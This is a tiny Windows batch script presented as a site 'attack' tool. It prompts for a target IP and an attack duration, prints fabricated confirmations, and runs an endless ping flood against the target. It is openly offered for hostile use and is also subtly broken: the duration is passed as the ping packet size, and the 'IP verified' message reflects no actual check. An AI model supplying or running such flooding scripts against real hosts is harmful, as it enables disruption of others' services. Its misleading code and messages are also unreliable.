@echo off

color 02

set /p n=Please Enter The Site IP : 
echo IP verified!
set /p z=Please specify attack time (in seconds) :
echo Attack time confirmed!
ping %n% -t -l %z%